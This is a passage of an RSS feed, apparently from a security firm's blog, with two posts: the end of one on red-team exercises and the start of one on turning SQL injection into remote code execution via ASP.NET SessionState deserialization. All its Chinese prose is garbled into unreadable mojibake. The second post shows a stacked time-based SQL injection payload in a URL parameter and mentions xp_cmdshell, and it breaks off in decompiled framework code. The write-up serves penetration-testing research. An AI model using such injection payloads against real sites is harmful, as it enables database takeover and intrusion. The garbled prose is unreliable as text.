&lt;p&gt;ÊàëÂÄëÂú®Ëøë‰∏âÂπ¥ÁöÑÁ¥ÖÈöäÊºîÁ∑¥Ôºå‰ª•‰ºÅÊ•≠Â∞çÂÖ∂ÁáüÈÅãÊúÄÈóúÈçµÁöÑË≥áË®äË≥áÁî¢‰ΩúÁÇ∫ÊºîÁ∑¥Ê®ôÁöÑÔºå‰∏¶Ê®°Êì¨ÁµÑÁπîÂûãÈß≠ÂÆ¢ÁöÑÊîªÊìäÊ®°ÂºèÔºåÈÄèÈÅéÂ§ñÈÉ®ÊÉÖÊêú„ÄÅÂèñÂæóÂ§ñÈÉ®Á≥ªÁµ±Ê¨äÈôê„ÄÅÊ©´ÂêëÁßªÂãï„ÄÅÊåÅÁ∫åÂèñÂæóÊõ¥Â§öÂÖßÈÉ®‰º∫ÊúçÂô®Ê¨äÈôêÂèäÊèêÊ¨ä„ÄÅÁ†¥Ëß£ÂØÜÁ¢ºÔºåÊúÄÁµÇÈÅîÂà∞‰ºÅÊ•≠ÊåáÂÆöÁöÑÈóúÈçµË≥áÁî¢Âü∑Ë°åÊºîÁ∑¥ÊÉÖÂ¢É„ÄÇËÄå‰ºÅÊ•≠ÈÄèÈÅéÈ´òÂº∑Â∫¶‰∏îÁ≤æÊ∫ñÁöÑÊºîÁ∑¥ÈÅéÁ®ãÔºåÈô§‰∫ÜÊòéÁ¢∫ÊéåÊè°ÂèØË¢´ÂÖ•‰æµÁöÑË∑ØÂæëÂ§ñÔºåÊõ¥Âæó‰ª•Ê™¢Ë¶ñ‰∏äËø∞ÂïèÈ°åÁöÑ‰∏çË∂≥‰∏¶ÊåÅÁ∫åÊîπÂñÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëË™çÁÇ∫ÔºåÂè™Ë¶Å‰Ω†ÁöÑ‰ºÅÊ•≠Â§†ÈáçË¶ÅÔºàÂ∞çÈß≠ÂÆ¢ËÄåË®ÄÈáçË¶ÅÔºåËÄå‰∏çÊòØËá™Â∑±Ë¶∫ÂæóÈáçË¶ÅÔºâÔºåÁµÑÁπîÂûãÁöÑÊîªÊìäÂ∞±‰∏çÊúÉÂÅúÊ≠áÔºÅ‰ºÅÊ•≠ÂîØÊúâ‰∏çÊñ∑ÁöÑÊâæÂá∫Ëá™Â∑±‰∏çË∂≥‰πãËôïÔºåÊåÅÁ∫åÊèêÂçáËá™Â∑±ÁöÑÈò≤Á¶¶Âº∑Â∫¶ÊâçÊòØËÉΩÁúüÊ≠£Èôç‰ΩéÈ¢®Èö™ÁöÑÊ≠£Á¢∫‰ΩúÊ≥ï„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá≥Êñº„ÄåÁ¨¨‰∏âÊñπ‰æõÊáâÈèàÂÆâÂÖ®„ÄçÂèä„ÄåÂ¶Ç‰ΩïÊõ¥ÂÆåÊï¥ÁöÑÂà∂ÂÆöË≥áÂÆâÁ≠ñÁï•„ÄçÔºåÊàëÂÄëÂ∞áÊâæÊôÇÈñìÂè¶Â§ñË∑üÂ§ßÂÆ∂Ë™™Êòé„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers/</link>
                <guid>https://devco.re/blog/2020/08/21/the-enemy-is-not-ransomware-its-nation-state-hackers</guid>
                <pubDate>Fri, 21 Aug 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Âæû SQL Âà∞ RCE: Âà©Áî® SessionState ÂèçÂ∫èÂàóÂåñÊîªÊìä ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºè</title>
                <description>&lt;p&gt;‰ªäÊó•‰æÜËÅäËÅäÂú®ÂéªÂπ¥ÊüêÊ¨°Êª≤ÈÄèÊ∏¨Ë©¶ÈÅé‰∏≠ÁôºÁèæÁöÑË∂£‰∫ãÔºåÈÇ£ÊòØÂú®‰∏ÄÂÄãÈ¢®ÂíåÊó•È∫óÁöÑ‰∏ãÂçàÔºåËàáÂæÄÂ∏∏‰∏ÄÊ®£ÈÄ≤Ë°åËëóÊûØÁá•ÁöÑÊ∏¨Ë©¶Áí∞ÁØÄÔºåÂ∞çÊØèÂÄãÂèÉÊï∏ÂòóË©¶ÂêÑÁ®ÆÂèØËÉΩÁöÑÊ≥®ÂÖ•Ôºå‰ΩÜÈÅ≤ÈÅ≤Ê≤íÊúâ‰ªª‰ΩïÈÄ≤Â±ïÂíåÁ™ÅÁ†¥ÔºåÁõ¥Âà∞Âú®ÊüêÂÄãÈ†ÅÈù¢‰∏äÊ≥®ÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1; waitfor delay &apos;00:00:05&apos;--&lt;/code&gt;ÔºåÁÑ∂Âæå‰ªñÂ∞±Âç°‰Ωè‰∫ÜÔºåÈÅé‰∫ÜÊÅ∞Â•Ω 5 ÁßíÈêòÂæå‰º∫ÊúçÂô®ÂèàÊúâÂõûÊáâÔºåÈÄôË°®Á§∫ÊàëÂÄëÊâæÂà∞‰∏ÄÂÄã SQL Server ‰∏äÁöÑ SQL InjectionÔºÅ&lt;/p&gt;

&lt;p&gt;‰∏Ä‰∫õÈô≥Ëàä„ÄÅÈæêÂ§ßÁöÑÁ≥ªÁµ±‰∏≠ÔºåÂõ†ÁÇ∫‰∏Ä‰∫õË§áÈõúÁöÑÂõ†Á¥†ÔºåÂæÄÂæÄ‰ªç‰ΩøÁî®Ëëó sa Â∏≥Êà∂‰æÜÁôªÂÖ• SQL ServerÔºåËÄåÂú®ÊúâÂ¶ÇÊ≠§È´òÊ¨äÈôêÁöÑË≥áÊñôÂ∫´Â∏≥Êà∂ÂâçÊèê‰∏ãÔºåÊàëÂÄëÂèØ‰ª•ËºïÊòìÂà©Áî® xp_cmdshell ‰æÜÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§‰ª•ÂèñÂæóË≥áÊñôÂ∫´‰º∫ÊúçÂô®ÁöÑ‰ΩúÊ•≠Á≥ªÁµ±ÊéßÂà∂Ê¨äÔºå‰ΩÜÂÅáÂ¶ÇÊïÖ‰∫ãÊúâÂ¶ÇÊ≠§È†ÜÂà©ÔºåÂ∞±‰∏çÊúÉÂá∫ÁèæÈÄôÁØáÊñáÁ´†ÔºåÊâÄ‰ª•ÁêÜÊâÄÁï∂ÁÑ∂ÊàëÂÄëÂèñÂæóÁöÑË≥áÊñôÂ∫´Â∏≥Êà∂‰∏¶Ê≤íÊúâË∂≥Â§†Ê¨äÈôê„ÄÇ‰ΩÜÂõ†ÁÇ∫ÁôºÁèæÁöÑ SQL Injection ÊòØ Stacked basedÔºåÊàëÂÄë‰ªçÁÑ∂ÂèØ‰ª•Â∞çË≥áÊñôË°®ÂÅö CRUDÔºåÈÅãÊ∞£Â•ΩÊéßÂà∂Âà∞‰∏Ä‰∫õÁ∂≤Á´ôË®≠ÂÆöËÆäÊï∏ÁöÑË©±ÔºåÁîöËá≥ÂèØ‰ª•Áõ¥Êé•ÈÅîÊàê RCEÔºåÊâÄ‰ª•ÈÇÑÊòØË©¶Ëëó dump schema ‰ª•‰∫ÜËß£Êû∂ÊßãÔºåËÄåÂú® dump ÈÅéÁ®ã‰∏≠ÁôºÁèæ‰∫Ü‰∏ÄÂÄãÊúâË∂£ÁöÑË≥áÊñôÂ∫´Ôºö&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: ASPState
[2 tables]
+---------------------------------------+
| dbo.ASPStateTempApplications          |
| dbo.ASPStateTempSessions              |
+---------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Èñ±ËÆÄÊñá‰ª∂Âæå‰∫ÜËß£Âà∞ÔºåÈÄôÂÄãË≥áÊñôÂ∫´ÁöÑÂ≠òÂú®Áî®ÈÄîÊòØÁî®‰æÜ‰øùÂ≠ò ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºèÁöÑ session„ÄÇ‰∏ÄËà¨ÊÉÖÊ≥Å‰∏ãÈ†êË®≠ session ÊòØÂÑ≤Â≠òÂú® ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºèÁöÑË®òÊÜ∂È´î‰∏≠Ôºå‰ΩÜÊüê‰∫õÂàÜÊï£ÂºèÊû∂ÊßãÔºà‰æãÂ¶Ç Load Balance Êû∂ÊßãÔºâÁöÑÊÉÖÊ≥Å‰∏ãÔºåÂêåÊôÇÊúÉÊúâÂ§öÂÄã‰∏ÄÊ®°‰∏ÄÊ®£ÁöÑ ASP.NET Á∂≤Á´ôÊáâÁî®Á®ãÂºèÈÅãË°åÂú®‰∏çÂêå‰º∫ÊúçÂô®‰∏ªÊ©ü‰∏äÔºåËÄå‰ΩøÁî®ËÄÖÊØèÊ¨°Ë´ãÊ±ÇÊôÇË¢´ÂàÜÈÖçÂà∞ÁöÑ‰º∫ÊúçÂô®‰∏ªÊ©ü‰πü‰∏çÊúÉÂÆåÂÖ®‰∏ÄËá¥ÔºåÂ∞±ÊúÉÈúÄË¶ÅÊúâÂèØ‰ª•ËÆìÂ§öÂÄã‰∏ªÊ©üÂÖ±‰∫´ session ÁöÑÊ©üÂà∂ÔºåËÄåÂÑ≤Â≠òÂú® SQL Server ‰∏äÂ∞±ÊòØ‰∏ÄÁ®ÆËß£Ê±∫ÊñπÊ°à‰πã‰∏ÄÔºåÊÉ≥ÂïüÁî®ÈÄôÂÄãÊ©üÂà∂ÂèØ‰ª•Âú® web.config ‰∏≠Ê∑ªÂä†Â¶Ç‰∏ãË®≠ÂÆöÔºö&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;system.web&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Â∞á session ‰øùÂ≠òÂú® SQL Server ‰∏≠„ÄÇ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;sessionState&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SQLServer&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;sqlConnectionString=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;data source=127.0.0.1;user id=&amp;lt;username&amp;gt;;password=&amp;lt;password&amp;gt;&quot;&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;timeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- È†êË®≠ÂÄºÔºåÂ∞á session ‰øùÂ≠òÂú®Ë®òÊÜ∂È´î‰∏≠„ÄÇ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;sessionState mode=&quot;InProc&quot; timeout=&quot;20&quot; /&amp;gt; --&amp;gt;&lt;/span&gt;
 
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Â∞á session ‰øùÂ≠òÂú® ASP.NET State Service ‰∏≠Ôºå
             Âè¶‰∏ÄÁ®ÆË∑®‰∏ªÊ©üÂÖ±‰∫´ session ÁöÑËß£Ê±∫ÊñπÊ°à„ÄÇ --&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
        &amp;lt;sessionState
            mode=&quot;StateServer&quot;
            stateConnectionString=&quot;tcpip=localhost:42424&quot;
            timeout=&quot;20&quot;
        /&amp;gt;
        --&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/system.web&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ËÄåË¶ÅÂú®Ë≥áÊñôÂ∫´‰∏≠Âª∫Á´ã ASPState ÁöÑË≥áÊñôÂ∫´ÔºåÂèØ‰ª•Âà©Áî®ÂÖßÂª∫ÁöÑÂ∑•ÂÖ∑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regsql.exe&lt;/code&gt; ÂÆåÊàêÈÄôÂÄã‰ªªÂãôÔºåÂè™ÈúÄË¶Å‰ΩøÁî®‰∏ãËø∞Êåá‰ª§Âç≥ÂèØÔºö&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Âª∫Á´ã ASPState Ë≥áÊñôÂ∫´&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssadd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p

&lt;span class=&quot;c&quot;&gt;# ÁßªÈô§ ASPState Ë≥áÊñôÂ∫´&lt;/span&gt;
aspnet_regsql.exe &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; sa &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; password &lt;span class=&quot;nt&quot;&gt;-ssremove&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sstype&lt;/span&gt; p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁèæÂú®ÊàëÂÄë‰∫ÜËß£Â¶Ç‰ΩïË®≠ÂÆö session ÁöÑÂÑ≤Â≠ò‰ΩçÁΩÆÔºå‰∏îÂèàÂèØ‰ª•ÊéßÂà∂ ASPState Ë≥áÊñôÂ∫´ÔºåÂèØ‰ª•ÂÅöÂà∞‰∫õ‰ªÄÈ∫ºÂë¢ÔºüÈÄôÂ∞±ÊòØÊñáÁ´†Ê®ôÈ°åÁöÑÈáçÈªûÔºåÂèñÂæó Remote Code ExecutionÔºÅ&lt;/p&gt;

&lt;p&gt;ASP.NET ÂÖÅË®±ÊàëÂÄëÂú® session ‰∏≠ÂÑ≤Â≠ò‰∏Ä‰∫õÁâ©‰ª∂Ôºå‰æãÂ¶ÇÂÑ≤Â≠ò‰∏ÄÂÄã List Áâ©‰ª∂Ôºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Session[&quot;secret&quot;] = new List&amp;lt;String&amp;gt;() { &quot;secret string&quot; };&lt;/code&gt;ÔºåÂ∞çÊñºÂ¶Ç‰ΩïÂ∞áÈÄô‰∫õÁâ©‰ª∂‰øùÂ≠òÂà∞ SQL Server ‰∏äÔºåÁêÜÊâÄÁï∂ÁÑ∂Âú∞‰ΩøÁî®‰∫Ü&lt;strong&gt;Â∫èÂàóÂåñÊ©üÂà∂&lt;/strong&gt;‰æÜËôïÁêÜÔºåËÄåÊàëÂÄëÂèàÊéßÂà∂‰∫ÜË≥áÊñôÂ∫´ÔºåÊâÄ‰ª•‰πüËÉΩÂü∑Ë°å‰ªªÊÑèÂèçÂ∫èÂàóÂåñÔºåÁÇ∫Ê≠§ÈúÄË¶ÅÂÖà‰∫ÜËß£ Session Áâ©‰ª∂Â∫èÂàóÂåñËàáÂèçÂ∫èÂàóÂåñÁöÑÈÅéÁ®ã„ÄÇ&lt;/p&gt;

&lt;p&gt;Á∞°ÂñÆÈñ±ËÆÄÁ®ãÂºèÁ¢ºÂæåÔºåÂæàÂø´Â∞±ÂèØ‰ª•ÂÆö‰ΩçÂá∫ËôïÁêÜÁõ∏ÈóúÈÅéÁ®ãÁöÑÈ°ûÂà•ÔºåÁÇ∫‰∫ÜÁ∏ÆÊ∏õË™™ÊòéÁöÑÁØáÂπÖÔºå‰ª•‰∏ãÂ∞áÁõ¥Êé•ÂàáÂÖ•ÈáçÈªûË™™ÊòéÂæûË≥áÊñôÂ∫´ÂèñÂá∫Ë≥áÊñôÂæåÈÄ≤Ë°å‰∫Ü‰ªÄÈ∫ºÊ®£ÁöÑÂèçÂ∫èÂàóÂåñÊìç‰Ωú„ÄÇÊ†∏ÂøÉ‰∏ªË¶ÅÊòØÈÄèÈÅéÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SqlSessionStateStore.GetItem&lt;/code&gt; ÂáΩÂºèÈÇÑÂéüÂá∫ Session Áâ©‰ª∂ÔºåÈõñÁÑ∂Â∑≤Áõ°ÂèØËÉΩÊääÁÑ°ÈóúÁ∑äË¶ÅÁöÑÁ®ãÂºèÁ¢ºÁßªÈô§Ôºå‰ΩÜË°åÊï∏ÈÇÑÊòØÂÅèÂ§öÔºåÂ¶ÇÊûúÊá∂ÂæóÈñ±ËÆÄÁ®ãÂºèÁ¢ºÁöÑÊúãÂèãÂèØ‰ª•Áõ¥Êé•‰∏ãÊãâÁπºÁ∫åÁúãÊñáÁ´†Ë™™Êòé XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlSessionStateStore&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreProviderBase&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;GetItem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionIDManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CheckIdLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* throwOnFail */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DoGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;locked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TimeSpan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockAge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lockId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                        &lt;span class=&quot;k&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateActions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actionFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlDataReader&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;MemoryStream&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlStateConnection&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGetExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_partitionInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AppSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @id&lt;/span&gt;
